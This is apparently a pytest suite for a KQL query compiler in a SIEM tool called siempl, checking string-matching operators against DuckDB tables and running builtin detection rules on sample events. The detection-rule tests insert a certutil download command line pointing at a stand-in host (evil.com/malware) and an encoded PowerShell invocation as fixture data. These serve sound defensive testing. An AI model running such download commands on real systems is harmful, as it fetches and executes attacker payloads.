"""KQL behavior tests against real DuckDB data (round 8 refactor).

Each test creates a temp table, inserts rows, compiles KQL, runs it, and asserts
actual result rows — never SQL-string comparison.  Operators here have all had bugs
or been undertested during the refactor (2026-10-13).
"""
from __future__ import annotations

import duckdb
import pytest

from siempl.db import Database
from siempl.kql import compile_kql, run_kql

# ── helpers ────────────────────────────────────────────────────────────────


def _run_duckdb(con: duckdb.DuckDBPyConnection, q: str):
    """Compile KQL and execute raw rows via DuckDB direct connection."""
    sql = compile_kql(q).sql
    return con.execute(sql).fetchall()


# ── duckdb direct-connection operator tests ────────────────────────────────
# GenericEvents is a known schema table so compile_kql allows it.


class TestInTildeCaseInsensitive:
    """in~ / !in~ must be case-insensitive on BOTH sides."""

    @pytest.fixture
    def con(self):
        c = duckdb.connect(":memory:")
        c.execute("CREATE TABLE GenericEvents(msg VARCHAR)")
        c.execute("INSERT INTO GenericEvents VALUES ('ABC'),('abc'),('Abc'),('xyz')")
        return c

    def test_in_tilde_lower_literal(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg in~ ('abc') | project msg")
        assert sorted(r[0] for r in rows) == ["ABC", "Abc", "abc"]

    def test_in_tilde_upper_literal(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg in~ ('ABC') | project msg")
        assert sorted(r[0] for r in rows) == ["ABC", "Abc", "abc"]

    def test_in_tilde_mixed_list(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg in~ ('AbC', 'XyZ') | project msg")
        assert sorted(r[0] for r in rows) == ["ABC", "Abc", "abc", "xyz"]

    def test_not_in_tilde_negates(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg !in~ ('abc') | project msg")
        assert sorted(r[0] for r in rows) == ["xyz"]

    def test_plain_in_stays_case_sensitive(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg in ('abc') | project msg")
        assert [r[0] for r in rows] == ["abc"]

    def test_not_in_stays_case_sensitive(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg !in ('abc') | project msg")
        assert sorted(r[0] for r in rows) == ["ABC", "Abc", "xyz"]


class TestMatchTildeCaseInsensitive:
    """=~ / !~ (case-insensitive equality).  In KQL =~ is NOT regex — it is
    case-insensitive string equality (regex is the `matches` operator)."""

    @pytest.fixture
    def con(self):
        c = duckdb.connect(":memory:")
        c.execute("CREATE TABLE GenericEvents(msg VARCHAR)")
        c.execute("INSERT INTO GenericEvents VALUES ('HelloWorld'),('helloworld'),('HELLOWORLD'),('goodbye')")
        return c

    def test_match_tilde_lower_literal(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg =~ 'helloworld' | project msg")
        assert sorted(r[0] for r in rows) == ["HELLOWORLD", "HelloWorld", "helloworld"]

    def test_match_tilde_upper_literal(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg =~ 'HELLOWORLD' | project msg")
        assert sorted(r[0] for r in rows) == ["HELLOWORLD", "HelloWorld", "helloworld"]

    def test_not_match_tilde_negates(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg !~ 'helloworld' | project msg")
        assert [r[0] for r in rows] == ["goodbye"]

    def test_match_tilde_column_uppercase(self, con):
        """Literal is lowercase, column has uppercase values — must still match."""
        rows = _run_duckdb(con, "GenericEvents | where msg =~ 'helloworld' | project msg")
        assert sorted(r[0] for r in rows) == ["HELLOWORLD", "HelloWorld", "helloworld"]


class TestContainsOperators:
    """contains / contains_cs / !contains / !contains_cs"""

    @pytest.fixture
    def con(self):
        c = duckdb.connect(":memory:")
        c.execute("CREATE TABLE GenericEvents(msg VARCHAR)")
        c.execute("INSERT INTO GenericEvents VALUES ('HelloWorld'),('helloworld'),('HELLOWORLD'),('goodbye')")
        return c

    def test_contains_case_insensitive_lower(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg contains 'hello' | project msg")
        assert sorted(r[0] for r in rows) == ["HELLOWORLD", "HelloWorld", "helloworld"]

    def test_contains_case_insensitive_upper(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg contains 'HELLO' | project msg")
        assert sorted(r[0] for r in rows) == ["HELLOWORLD", "HelloWorld", "helloworld"]

    def test_contains_cs_case_sensitive_lower(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg contains_cs 'hello' | project msg")
        assert [r[0] for r in rows] == ["helloworld"]

    def test_contains_cs_case_sensitive_upper(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg contains_cs 'HELLO' | project msg")
        assert [r[0] for r in rows] == ["HELLOWORLD"]

    def test_not_contains_negates(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg !contains 'hello' | project msg")
        assert [r[0] for r in rows] == ["goodbye"]

    def test_not_contains_cs_negates(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg !contains_cs 'hello' | project msg")
        assert sorted(r[0] for r in rows) == ["HELLOWORLD", "HelloWorld", "goodbye"]


class TestStartswithEndswithOperators:
    """startswith / endswith (case-insensitive) and startswith_cs / endswith_cs (case-sensitive), plus negations."""

    @pytest.fixture
    def con(self):
        c = duckdb.connect(":memory:")
        c.execute("CREATE TABLE GenericEvents(msg VARCHAR)")
        c.execute("INSERT INTO GenericEvents VALUES ('PrefixVal'),('prefixval'),('PREFIXVAL'),('NoMatch')")
        return c

    def test_startswith_case_insensitive_lower(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg startswith 'prefix' | project msg")
        assert sorted(r[0] for r in rows) == ["PREFIXVAL", "PrefixVal", "prefixval"]

    def test_startswith_case_insensitive_upper(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg startswith 'PREFIX' | project msg")
        assert sorted(r[0] for r in rows) == ["PREFIXVAL", "PrefixVal", "prefixval"]

    def test_not_startswith_negates(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg !startswith 'prefix' | project msg")
        assert [r[0] for r in rows] == ["NoMatch"]

    def test_endswith_case_insensitive_lower(self, con):
        c = duckdb.connect(":memory:")
        c.execute("CREATE TABLE GenericEvents(msg VARCHAR)")
        c.execute("INSERT INTO GenericEvents VALUES ('ValSuffix'),('valsuffix'),('VALSUFFIX'),('NoMatch')")
        rows = c.execute(compile_kql("GenericEvents | where msg endswith 'suffix' | project msg").sql).fetchall()
        assert sorted(r[0] for r in rows) == ["VALSUFFIX", "ValSuffix", "valsuffix"]

    def test_endswith_case_insensitive_upper(self, con):
        c = duckdb.connect(":memory:")
        c.execute("CREATE TABLE GenericEvents(msg VARCHAR)")
        c.execute("INSERT INTO GenericEvents VALUES ('ValSuffix'),('valsuffix'),('VALSUFFIX'),('NoMatch')")
        rows = c.execute(compile_kql("GenericEvents | where msg endswith 'SUFFIX' | project msg").sql).fetchall()
        assert sorted(r[0] for r in rows) == ["VALSUFFIX", "ValSuffix", "valsuffix"]

    def test_not_endswith_negates(self, con):
        c = duckdb.connect(":memory:")
        c.execute("CREATE TABLE GenericEvents(msg VARCHAR)")
        c.execute("INSERT INTO GenericEvents VALUES ('ValSuffix'),('valsuffix'),('VALSUFFIX'),('NoMatch')")
        rows = c.execute(compile_kql("GenericEvents | where msg !endswith 'suffix' | project msg").sql).fetchall()
        assert [r[0] for r in rows] == ["NoMatch"]

    def test_startswith_cs_is_case_sensitive(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg startswith_cs 'Prefix' | project msg")
        assert [r[0] for r in rows] == ["PrefixVal"]

    def test_not_startswith_cs_negates(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg !startswith_cs 'Prefix' | project msg")
        assert sorted(r[0] for r in rows) == ["NoMatch", "PREFIXVAL", "prefixval"]

    def test_endswith_cs_is_case_sensitive(self):
        c = duckdb.connect(":memory:")
        c.execute("CREATE TABLE GenericEvents(msg VARCHAR)")
        c.execute("INSERT INTO GenericEvents VALUES ('ValSuffix'),('valsuffix'),('VALSUFFIX'),('NoMatch')")
        rows = _run_duckdb(c, "GenericEvents | where msg endswith_cs 'Suffix' | project msg")
        assert [r[0] for r in rows] == ["ValSuffix"]
        rows = _run_duckdb(c, "GenericEvents | where msg !endswith_cs 'Suffix' | project msg")
        assert sorted(r[0] for r in rows) == ["NoMatch", "VALSUFFIX", "valsuffix"]


class TestHasHasAnyOperators:
    """has / has_cs / !has / !has_cs / has_any / !has_any — word-boundary matching.
    NOTE: has requires the search term to be a standalone word boundary match.
    "ABC" does NOT match has "bc" because "bc" is not a standalone word inside "ABC"."""

    @pytest.fixture
    def con(self):
        c = duckdb.connect(":memory:")
        c.execute("CREATE TABLE GenericEvents(msg VARCHAR)")
        # 'hash' must NOT match 'rehash' because 'hash' is not a whole word there
        c.execute(
            "INSERT INTO GenericEvents VALUES "
            "('hash value'),('rehash here'),('HASH VALUE'),('Hash Value'),('nothing')"
        )
        return c

    def test_has_case_insensitive_lower(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg has 'hash' | project msg")
        assert sorted(r[0] for r in rows) == ["HASH VALUE", "Hash Value", "hash value"]

    def test_has_case_insensitive_upper(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg has 'HASH' | project msg")
        assert sorted(r[0] for r in rows) == ["HASH VALUE", "Hash Value", "hash value"]

    def test_has_cs_case_sensitive_lower(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg has_cs 'hash' | project msg")
        assert [r[0] for r in rows] == ["hash value"]

    def test_has_cs_case_sensitive_upper(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg has_cs 'HASH' | project msg")
        assert [r[0] for r in rows] == ["HASH VALUE"]

    def test_not_has_negates(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg !has 'hash' | project msg")
        assert sorted(r[0] for r in rows) == ["nothing", "rehash here"]

    def test_not_has_cs_negates(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg !has_cs 'hash' | project msg")
        assert sorted(r[0] for r in rows) == ["HASH VALUE", "Hash Value", "nothing", "rehash here"]

    def test_has_any_case_insensitive(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg has_any ('hash', 'xyz') | project msg")
        assert sorted(r[0] for r in rows) == ["HASH VALUE", "Hash Value", "hash value"]

    def test_not_has_any_negates(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg !has_any ('hash', 'xyz') | project msg")
        assert sorted(r[0] for r in rows) == ["nothing", "rehash here"]

    def test_has_does_not_match_substring_in_middle_of_word(self, con):
        """Critical boundary test: 'hash' inside 'rehash' must NOT match."""
        rows = _run_duckdb(con, "GenericEvents | where msg has 'hash' | project msg")
        for r in rows:
            assert "rehash" not in r[0].lower()


class TestStringEqualityCaseSensitive:
    """== on strings must be exact (case-sensitive) in KQL."""

    @pytest.fixture
    def con(self):
        c = duckdb.connect(":memory:")
        c.execute("CREATE TABLE GenericEvents(msg VARCHAR)")
        c.execute("INSERT INTO GenericEvents VALUES ('Exact'),('exact'),('EXACT'),('other')")
        return c

    def test_equals_string_case_sensitive_lower(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg == 'exact' | project msg")
        assert [r[0] for r in rows] == ["exact"]

    def test_equals_string_case_sensitive_upper(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg == 'EXACT' | project msg")
        assert [r[0] for r in rows] == ["EXACT"]

    def test_equals_string_case_sensitive_mixed(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg == 'Exact' | project msg")
        assert [r[0] for r in rows] == ["Exact"]

    def test_not_equals_string(self, con):
        rows = _run_duckdb(con, "GenericEvents | where msg != 'exact' | project msg")
        assert sorted(r[0] for r in rows) == ["EXACT", "Exact", "other"]


# ── siempl.db Database integration tests ────────────────────────────────────


class TestUsingSiemplDatabase:
    """Run KQL via siempl.db.Database (temp file) — same operators, higher-level API."""

    def test_in_tilde_via_run_kql(self, tmp_path):
        db = Database(str(tmp_path / "t.duckdb"))
        db.execute("DELETE FROM GenericEvents")
        db.execute("INSERT INTO GenericEvents(Message) VALUES ('ABC'),('abc'),('xyz')")
        r = run_kql(db, "GenericEvents | where Message in~ ('abc') | project Message")
        assert sorted(row[0] for row in r.rows) == ["ABC", "abc"]

    def test_contains_cs_via_run_kql(self, tmp_path):
        db = Database(str(tmp_path / "t.duckdb"))
        db.execute("DELETE FROM GenericEvents")
        db.execute("INSERT INTO GenericEvents(Message) VALUES ('Hello'),('hello'),('HELLO'),('nope')")
        r = run_kql(db, "GenericEvents | where Message contains_cs 'Hello' | project Message")
        assert [row[0] for row in r.rows] == ["Hello"]

    def test_has_any_via_run_kql(self, tmp_path):
        db = Database(str(tmp_path / "t.duckdb"))
        db.execute("DELETE FROM GenericEvents")
        db.execute("INSERT INTO GenericEvents(Message) VALUES ('foo bar'),('baz qux'),('nothing')")
        r = run_kql(db, "GenericEvents | where Message has_any ('foo', 'baz') | project Message")
        assert sorted(row[0] for row in r.rows) == ["baz qux", "foo bar"]

    def test_match_tilde_via_run_kql(self, tmp_path):
        db = Database(str(tmp_path / "t.duckdb"))
        db.execute("DELETE FROM GenericEvents")
        db.execute("INSERT INTO GenericEvents(Message) VALUES ('Test123'),('test123'),('nope')")
        r = run_kql(db, "GenericEvents | where Message =~ 'test123' | project Message")
        assert sorted(row[0] for row in r.rows) == ["Test123", "test123"]

    def test_string_equality_via_run_kql(self, tmp_path):
        db = Database(str(tmp_path / "t.duckdb"))
        db.execute("DELETE FROM GenericEvents")
        db.execute("INSERT INTO GenericEvents(Message) VALUES ('Exact'),('exact'),('other')")
        r = run_kql(db, "GenericEvents | where Message == 'Exact' | project Message")
        assert [row[0] for row in r.rows] == ["Exact"]


# ── builtin rule against real data ──────────────────────────────────────────


class TestBuiltinRuleAgainstRealData:
    """A builtin detection rule KQL query must compile and return real rows."""

    def test_encoded_powershell_builtin_query(self, tmp_path):
        """Rule 4: Encoded PowerShell — uses `contains` operators.
        Create matching ProcessEvents rows and verify the rule query returns them.
        """
        db = Database(str(tmp_path / "t.duckdb"))
        db.execute("DELETE FROM ProcessEvents")
        db.execute("INSERT INTO ProcessEvents"
                   "(TimeGenerated, ProcessName, ProcessCmdLine) VALUES "
                   "(now(), 'powershell.exe', '-Enc dGVzdA=='),"
                   "(now(), 'pwsh', 'legitimate script'),"
                   "(now(), 'powershell', '-EncodedCommand something')")
        kql = (
            'ProcessEvents | where ProcessName contains "powershell" '
            'and (ProcessCmdLine contains "EncodedCommand" '
            'or ProcessCmdLine contains "-Enc ") | project ProcessName, ProcessCmdLine'
        )
        r = run_kql(db, kql)
        names = {row[0] for row in r.rows}
        assert "powershell.exe" in names
        assert "powershell" in names
        assert "pwsh" not in names

    def test_certutil_download_builtin_query(self, tmp_path):
        """Rule 5: Certutil Download — uses `contains` operators."""
        db = Database(str(tmp_path / "t.duckdb"))
        db.execute("DELETE FROM ProcessEvents")
        db.execute("INSERT INTO ProcessEvents"
                   "(TimeGenerated, ProcessName, ProcessCmdLine) VALUES "
                   "(now(), 'certutil.exe', '-urlcache -split -f http://evil.com/malware'),"
                   "(now(), 'notepad.exe', 'hello.txt'),"
                   "(now(), 'CERTUTIL', '-urlcache something')")
        kql = (
            'ProcessEvents | where ProcessName contains "certutil" '
            'and (ProcessCmdLine contains "urlcache" '
            'or ProcessCmdLine contains "split" '
            'or ProcessCmdLine contains "://") | project ProcessName'
        )
        r = run_kql(db, kql)
        names = {row[0] for row in r.rows}
        assert "certutil.exe" in names
        assert "CERTUTIL" in names
        assert "notepad.exe" not in names

    def test_service_account_interactive_login_builtin_query(self, tmp_path):
        """Rule 22: Service Account Interactive Login — uses endswith / contains."""
        db = Database(str(tmp_path / "t.duckdb"))
        db.execute("DELETE FROM AuthEvents")
        db.execute("INSERT INTO AuthEvents"
                   "(TimeGenerated, EventResult, LogonType, UserName) VALUES "
                   "(now(), 'success', '2',  'WORKSTATION$'),"
                   "(now(), 'success', '10', 'DOMAIN\\\\SYSTEM'),"
                   "(now(), 'success', '2',  'alice'),"
                   "(now(), 'failure', '2',  'WORKSTATION$')")
        kql = (
            'AuthEvents | where EventResult == "success" and LogonType in ("2", "10", "7") '
            'and (UserName endswith "$" or UserName contains "SYSTEM" '
            'or UserName contains "NETWORK SERVICE") | project UserName'
        )
        r = run_kql(db, kql)
        names = {row[0] for row in r.rows}
        assert "WORKSTATION$" in names
        assert "DOMAIN\\\\SYSTEM" in names
        assert "alice" not in names


# ── edge-case / regression guards ───────────────────────────────────────────


class TestCaseInsensitiveEdgeCases:
    """Tests that would FAIL if case-insensitive handling were wrong on either side."""

    def test_in_tilde_column_has_uppercase_literal_is_lowercase(self):
        """Column value is uppercase, literal is lowercase — must match."""
        c = duckdb.connect(":memory:")
        c.execute("CREATE TABLE GenericEvents(v VARCHAR)")
        c.execute("INSERT INTO GenericEvents VALUES ('UPPERCASE'),('lowercase'),('Mixed')")
        rows = _run_duckdb(c, "GenericEvents | where v in~ ('uppercase') | project v")
        assert sorted(r[0] for r in rows) == ["UPPERCASE"]

    def test_contains_column_has_uppercase_literal_is_lowercase(self):
        """Column value contains uppercase, literal is lowercase — must match."""
        c = duckdb.connect(":memory:")
        c.execute("CREATE TABLE GenericEvents(v VARCHAR)")
        c.execute("INSERT INTO GenericEvents VALUES ('UPPERCASE'),('lowercase'),('Mixed')")
        rows = _run_duckdb(c, "GenericEvents | where v contains 'case' | project v")
        assert sorted(r[0] for r in rows) == ["UPPERCASE", "lowercase"]

    def test_startswith_column_uppercase_literal_lowercase(self):
        """Column starts with uppercase, literal is lowercase — must match."""
        c = duckdb.connect(":memory:")
        c.execute("CREATE TABLE GenericEvents(v VARCHAR)")
        c.execute("INSERT INTO GenericEvents VALUES ('PREFIX'),('prefix'),('NoPrefix')")
        rows = _run_duckdb(c, "GenericEvents | where v startswith 'prefix' | project v")
        assert sorted(r[0] for r in rows) == ["PREFIX", "prefix"]

    def test_endswith_column_uppercase_literal_lowercase(self):
        """Column ends with uppercase, literal is lowercase — must match."""
        c = duckdb.connect(":memory:")
        c.execute("CREATE TABLE GenericEvents(v VARCHAR)")
        c.execute("INSERT INTO GenericEvents VALUES ('SUFFIX'),('suffix'),('NoExtra')")
        rows = _run_duckdb(c, "GenericEvents | where v endswith 'suffix' | project v")
        assert sorted(r[0] for r in rows) == ["SUFFIX", "suffix"]

    def test_match_tilde_column_uppercase_literal_lowercase(self):
        """Column value is uppercase, =~ literal is lowercase — must match (case-insensitive equals)."""
        c = duckdb.connect(":memory:")
        c.execute("CREATE TABLE GenericEvents(v VARCHAR)")
        c.execute("INSERT INTO GenericEvents VALUES ('HELLO'),('hello'),('nope')")
        rows = _run_duckdb(c, "GenericEvents | where v =~ 'hello' | project v")
        assert sorted(r[0] for r in rows) == ["HELLO", "hello"]

    def test_has_column_uppercase_literal_lowercase(self):
        """Column value has uppercase word, literal is lowercase — must match."""
        c = duckdb.connect(":memory:")
        c.execute("CREATE TABLE GenericEvents(v VARCHAR)")
        c.execute("INSERT INTO GenericEvents VALUES ('WORD here'),('word here'),('WORD')")
        rows = _run_duckdb(c, "GenericEvents | where v has 'word' | project v")
        assert sorted(r[0] for r in rows) == ["WORD", "WORD here", "word here"]

    def test_contains_cs_does_not_match_wrong_case(self):
        """Critical: contains_cs must NOT match wrong case."""
        c = duckdb.connect(":memory:")
        c.execute("CREATE TABLE GenericEvents(v VARCHAR)")
        c.execute("INSERT INTO GenericEvents VALUES ('Exact'),('exact'),('EXACT')")
        rows = _run_duckdb(c, "GenericEvents | where v contains_cs 'exact' | project v")
        assert [r[0] for r in rows] == ["exact"]

    def test_has_cs_does_not_match_wrong_case(self):
        """Critical: has_cs must NOT match wrong case."""
        c = duckdb.connect(":memory:")
        c.execute("CREATE TABLE GenericEvents(v VARCHAR)")
        c.execute("INSERT INTO GenericEvents VALUES ('Word'),('word'),('WORD')")
        rows = _run_duckdb(c, "GenericEvents | where v has_cs 'word' | project v")
        assert [r[0] for r in rows] == ["word"]
